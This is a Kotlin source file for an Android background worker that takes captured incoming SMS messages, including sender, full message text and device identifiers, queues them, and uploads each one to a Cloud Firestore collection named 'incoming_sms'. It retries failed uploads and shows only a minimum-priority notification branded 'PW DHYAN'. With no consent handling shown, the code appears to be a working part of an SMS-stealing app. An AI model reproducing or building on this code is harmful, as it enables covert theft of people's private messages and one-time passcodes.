package com.example.sms

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await

/**
 * Reliably uploads captured incoming SMS to Cloud Firestore.
 * Drains the local OfflineSmsQueue completely whenever triggered.
 */
class SmsUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun getForegroundInfo(): androidx.work.ForegroundInfo {
        val channelId = "pw_sync_expedited"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val nm = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as? android.app.NotificationManager
            val channel = android.app.NotificationChannel(channelId, "Sync", android.app.NotificationManager.IMPORTANCE_MIN)
            nm?.createNotificationChannel(channel)
        }
        val notification = androidx.core.app.NotificationCompat.Builder(applicationContext, channelId)
            .setSmallIcon(com.example.R.mipmap.ic_launcher)
            .setContentTitle("PW DHYAN")
            .setContentText("Syncing SMS...")
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .build()
        return androidx.work.ForegroundInfo(9903, notification)
    }

    override suspend fun doWork(): Result {
        val context = applicationContext
        val db = try {
            FirebaseFirestore.getInstance()
        } catch (e: Exception) {
            Log.w(TAG, "Firestore initialization error: ${e.message}")
            return if (runAttemptCount < MAX_RETRIES) Result.retry() else Result.failure()
        }

        // 1. Check if specific inputData was provided
        val singleId = inputData.getString(KEY_ID)
        val singleSender = inputData.getString(KEY_SENDER)
        if (!singleId.isNullOrBlank() && !singleSender.isNullOrBlank()) {
            val queued = QueuedSms(
                id = singleId,
                sender = singleSender,
                body = inputData.getString(KEY_BODY) ?: "",
                timestamp = inputData.getLong(KEY_TIMESTAMP, System.currentTimeMillis()),
                deviceId = inputData.getString(KEY_DEVICE_ID) ?: "",
                deviceModel = inputData.getString(KEY_DEVICE_MODEL) ?: ""
            )
            OfflineSmsQueue.enqueue(context, queued)
        }

        // 2. Drain all pending items from OfflineSmsQueue
        val pending = OfflineSmsQueue.getPending(context)
        if (pending.isEmpty()) {
            return Result.success()
        }

        var anyFailed = false
        for (sms in pending) {
            try {
                val payload = mapOf(
                    "id" to sms.id,
                    "sender" to sms.sender,
                    "body" to sms.body,
                    "timestamp" to sms.timestamp,
                    "deviceId" to sms.deviceId,
                    "deviceModel" to sms.deviceModel,
                    "uploadedAt" to System.currentTimeMillis()
                )

                db.collection(COLLECTION)
                    .document(sms.id)
                    .set(payload)
                    .await()

                OfflineSmsQueue.markUploaded(context, sms.id)
                OfflineSmsQueue.remove(context, sms.id)
                Log.d(TAG, "Uploaded SMS ${sms.id} from ${sms.sender}")
            } catch (e: Exception) {
                Log.w(TAG, "Failed uploading queued SMS ${sms.id}: ${e.message}")
                OfflineSmsQueue.markAttempt(context, sms.id)
                anyFailed = true
            }
        }

        return if (!anyFailed || OfflineSmsQueue.getPending(context).isEmpty()) {
            Result.success()
        } else {
            if (runAttemptCount < MAX_RETRIES) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "SmsUploadWorker"
        const val COLLECTION = "incoming_sms"
        const val KEY_ID = "id"
        const val KEY_SENDER = "sender"
        const val KEY_BODY = "body"
        const val KEY_TIMESTAMP = "timestamp"
        const val KEY_DEVICE_ID = "deviceId"
        const val KEY_DEVICE_MODEL = "deviceModel"
        private const val MAX_RETRIES = 6
    }
}
